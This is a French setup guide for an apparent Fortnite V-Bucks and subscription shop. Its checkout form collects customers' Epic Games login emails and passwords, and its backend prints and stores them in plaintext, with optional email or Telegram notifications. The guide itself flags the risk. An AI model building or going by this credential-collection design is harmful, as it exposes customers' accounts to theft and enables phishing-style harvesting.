# 📦 Guide de Réception des Commandes

## 🎯 Fonctionnement

Le système adapte automatiquement le formulaire selon les produits dans le panier :

### Pour les **V-Bucks** (packs 1000, 2800, 5000, 13500)
Le client remplit :
- ✅ Nom et Prénom
- ✅ Email de contact
- ✅ Plateforme (Xbox, PlayStation, PC, Switch, Mobile)

### Pour **Fortnite club** (abonnement)
Le client remplit :
- ✅ Nom et Prénom
- ✅ Email de contact
- ✅ Pseudo Epic Games
- ✅ Email de connexion Epic Games
- ✅ Mot de passe Epic Games
- ✅ Numéro WhatsApp

---

## 📬 Comment Vous Recevez les Commandes

### 1. **Dans la Console du Serveur Backend**

Quand un client passe commande, les informations s'affichent dans le terminal où tourne le backend :

```bash
============================================================
🎉 NOUVELLE COMMANDE REÇUE
============================================================
📦 Order ID: abc123-def456-ghi789
💰 Montant: 9000 FCFA

👤 INFORMATIONS CLIENT:
   Nom: Jean Dupont
   Email: jean.dupont@email.com
   Type: club

🎮 FORTNITE club:
   Pseudo Epic: JeanGamer99
   Email Epic: jean.epic@gmail.com
   Mot de passe: MotDePasse123
   WhatsApp: +229 97 XX XX XX

📋 ARTICLES:
   - Fortnite club x1 = 4500 FCFA
============================================================
```

### 2. **Consulter les Commandes via API**

Vous pouvez consulter toutes les commandes enregistrées :

```bash
# Voir toutes les commandes
curl http://localhost:5000/api/orders

# Voir une commande spécifique
curl http://localhost:5000/api/orders/ORDER_ID
```

---

## 🚀 Comment Tester

### 1. **Démarrer le Backend Local**

```bash
cd /home/FeLLeRGLITCH_x/FortniteItems
python3 lygos.py
```

Le serveur démarre sur `http://localhost:5000`

### 2. **Ouvrir le Site**

```bash
# Dans un autre terminal
python3 -m http.server 8000
```

Puis ouvrez http://localhost:8000

### 3. **Tester un Achat V-Bucks**

1. Ajoutez un pack V-Bucks au panier (1000, 2800, 5000 ou 13500)
2. Cliquez sur "Passer à la Commande"
3. Le formulaire affiche :
   - Nom et Prénom
   - Email
   - Plateforme ← **Champ spécifique V-Bucks**
4. Remplissez et continuez
5. Regardez la console du backend → Les infos apparaissent

### 4. **Tester un Achat Fortnite club**

1. Ajoutez Fortnite club au panier
2. Cliquez sur "Passer à la Commande"
3. Le formulaire affiche :
   - Nom et Prénom
   - Email
   - Pseudo Epic Games ← **Champs spécifiques club**
   - Email Epic Games
   - Mot de passe Epic
   - Numéro WhatsApp
4. Remplissez et continuez
5. Regardez la console du backend → Toutes les infos s'affichent

---

## 🔧 Ajouter des Notifications (optionnel)

### Option 1 : Email

Ajoutez dans `lygos.py` après la ligne `# TODO: Envoyer une notification` :

```python
import smtplib
from email.mime.text import MIMEText

def send_notification_email(order_details):
    msg = MIMEText(json.dumps(order_details, indent=2))
    msg['Subject'] = f"Nouvelle Commande {order_details['order_id']}"
    msg['From'] = "votre-email@gmail.com"
    msg['To'] = "votre-email@gmail.com"
    
    with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
        smtp.login("votre-email@gmail.com", "votre-mot-de-passe-app")
        smtp.send_message(msg)
```

### Option 2 : Telegram

```python
import requests

def send_telegram_message(order_details):
    bot_token = "VOTRE_BOT_TOKEN"
    chat_id = "VOTRE_CHAT_ID"
    
    message = f"""
🎉 NOUVELLE COMMANDE

Order ID: {order_details['order_id']}
Montant: {order_details['amount']} FCFA
Client: {order_details['customer']['fullName']}
Email: {order_details['customer']['contactEmail']}
    """
    
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    requests.post(url, json={"chat_id": chat_id, "text": message})
```

### Option 3 : WhatsApp Business API

Utilisez l'API WhatsApp Business pour recevoir les commandes directement sur votre WhatsApp.

---

## 📊 Structure des Données Reçues

```json
{
  "order_id": "abc123-def456",
  "timestamp": "2025-10-30T15:30:00",
  "amount": 9000,
  "items": [
    {
      "id": "2",
      "name": "2800 V-Bucks",
      "price": 9000,
      "quantity": 1
    }
  ],
  "customer": {
    "fullName": "Jean Dupont",
    "contactEmail": "jean@email.com",
    "productType": "vbucks",
    "platform": "ps"
  }
}
```

Ou pour Fortnite club :

```json
{
  "customer": {
    "fullName": "Jean Dupont",
    "contactEmail": "jean@email.com",
    "productType": "club",
    "epicUsername": "JeanGamer99",
    "epicLoginEmail": "jean.epic@gmail.com",
    "epicPassword": "MotDePasse123",
    "whatsappNumber": "+229 97 XX XX XX"
  }
}
```

---

## 🔒 Sécurité

⚠️ **Important** : Les mots de passe Epic Games sont transmis et stockés temporairement. En production :
- Utilisez HTTPS obligatoirement
- Chiffrez les données sensibles
- Supprimez les mots de passe après traitement
- Respectez le RGPD

---

## ✅ Checklist de Déploiement

Avant de mettre en production :

- [ ] Tester les 2 types de formulaires (V-Bucks et club)
- [ ] Vérifier que les infos arrivent dans la console
- [ ] Configurer les notifications (Email/Telegram/WhatsApp)
- [ ] Déployer le backend sur Render avec les nouvelles routes
- [ ] Mettre à jour l'URL du backend dans checkout.js
- [ ] Tester un vrai paiement de bout en bout
- [ ] Vérifier la sécurité des données sensibles

---

## 🆘 Support

Si vous avez des questions ou besoin d'aide pour configurer les notifications, contactez-moi !
